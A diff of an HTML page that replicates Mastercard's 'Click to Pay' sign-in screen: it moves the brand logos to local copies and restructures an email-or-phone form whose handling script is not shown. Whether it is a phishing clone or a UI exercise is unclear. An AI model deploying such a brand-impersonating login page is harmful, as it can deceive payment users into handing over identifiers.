@@ -1,106 +1,88 @@
 <!DOCTYPE html>
 <html lang="en-US">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
-  <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
-  <title>Click to Pay</title>
-
-  <link rel="stylesheet" href="/style.css" />
-</head>
-<body>
-  <div class="root-container">
-    <!-- HEADER -->
-    <header class="header__wrapper">
-      <div class="container header__container">
-        <div class="header__brand">
-          <!-- Click to Pay logo -->
-          <img
-            src="https://src.mastercard.com/profile/static/media/ctpay-logo-dark.3973aefa.svg"
-            alt="Click to Pay"
-            class="logo-ctp"
-          />
-          <!-- Mastercard logo -->
-          <img
-            src="https://www.mastercard.us/etc.clientlibs/mastercard/clientlibs/clientlib-base/resources/img/mc_symbol_opt_45_3x.png"
-            alt="Mastercard"
-            class="logo-mc"
-          />
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
+    <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
+    <title>Click to Pay</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <div class="root-container">
+      <!-- HEADER -->
+      <header class="header__wrapper">
+        <div class="container header__container">
+          <div class="header__brand">
+            <img src="/index_files/ctpay-logo.svg" alt="Click to Pay" class="logo-ctp" />
+            <img src="/index_files/mc-symbol.png" alt="Mastercard" class="logo-mc" />
+          </div>
+          <nav class="header__nav">
+            <a href="#" class="header__item">
+              <span>US</span>
+              <span class="icon-globe">🌐</span>
+            </a>
+          </nav>
         </div>
-        <nav class="header__nav">
-          <a href="#" class="header__item">
-            <span>US</span>
-            <span class="icon-globe">🌐</span>
-          </a>
-        </nav>
-      </div>
-    </header>
+      </header>
 
-    <!-- MAIN -->
-    <main>
-      <div class="container">
-        <div class="headline">
-          <h1 class="display-lg color-orange-high">Click to Pay</h1>
-          <h2 class="display-lg">The fast, secure way to pay online</h2>
-        </div>
-
-        <form id="login-form" class="container-fluid" novalidate>
-          <div class="row">
-            <div class="col-full">
-              <p>Create a profile or sign in</p>
-            </div>
+      <!-- MAIN -->
+      <main>
+        <div class="container">
+          <div class="headline">
+            <h1 class="display-lg color-orange-high">Click to Pay</h1>
+            <h2 class="display-lg">The fast, secure way to pay<br />online</h2>
           </div>
 
-          <div class="row">
-            <div class="col">
-              <div class="al-input floating">
-                <input
-                  type="text"
-                  id="userId"
-                  name="userId"
-                  placeholder=" "
-                  class="al-input__input"
-                  required
-                />
-                <label for="userId" class="al-input__label">Email or mobile number</label>
-                <div class="al-input__subtext">
-                  We'll use this to verify your identity. Message/data rates may apply.
+          <form id="login-form" class="container-fluid" novalidate>
+            <div class="row">
+              <div class="col-full">
+                <p>Create a profile or sign in</p>
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="col">
+                <div class="al-input floating">
+                  <input
+                    type="text"
+                    id="userId"
+                    name="userId"
+                    placeholder=" "
+                    class="al-input__input"
+                    required
+                  />
+                  <label for="userId" class="al-input__label">Email or mobile number</label>
+                  <div class="al-input__subtext">
+                    Click to Pay will use this information to verify you and may send verification codes to this number.
+                    <br />Message/data rates may apply.
+                  </div>
+                  <div class="al-input__error-icon">❗</div>
+                  <div class="al-input__error-text hidden" id="error-required">This field is required</div>
+                  <div class="al-input__error-text hidden" id="error-format">Confirm your email and try again</div>
                 </div>
               </div>
             </div>
-          </div>
-
-          <div class="row-vertical-align-bottom">
-            <div class="col-full">
-              <div class="al-button">
-                <button type="submit" id="submit-btn" class="uppercase fill" aria-label="Continue" disabled>
-                  <span class="al-button__label">Continue</span>
-                </button>
-              </div>
-            </div>
-          </div>
-        </form>
-      </div>
-    </main>
-
-    <!-- FOOTER -->
-    <footer class="footer">
-      <div class="container">
-        <div class="row">
-          <div class="col">
-            <nav class="footer__nav">
-              <a href="#" class="btn btn--footer">Terms</a>
-              <a href="#" class="btn btn--footer">Privacy</a>
-              <a href="#" class="btn btn--footer">Cookies</a>
-              <a href="#" class="btn btn--footer">Feedback</a>
-            </nav>
-          </div>
+          </form>
         </div>
-      </div>
-    </footer>
-  </div>
 
-  <script type="module" src="/src/main.js"></script>
-</body>
+        <!-- BUTTON -->
+        <div class="al-button container">
+          <button type="submit" id="submit-btn" class="uppercase fill" aria-label="Continue" disabled>
+            <span class="al-button__label">CONTINUE</span>
+          </button>
+        </div>
+
+        <!-- LEGAL LINKS -->
+        <div class="container legal-links">
+          <a href="#" class="legal-link">TERMS</a>
+          <a href="#" class="legal-link">PRIVACY</a>
+          <a href="#" class="legal-link">COOKIES</a>
+          <a href="#" class="legal-link">FEEDBACK</a>
+        </div>
+      </main>
+    </div>
+
+    <script type="module" src="/src/main.js"></script>
+  </body>
 </html>
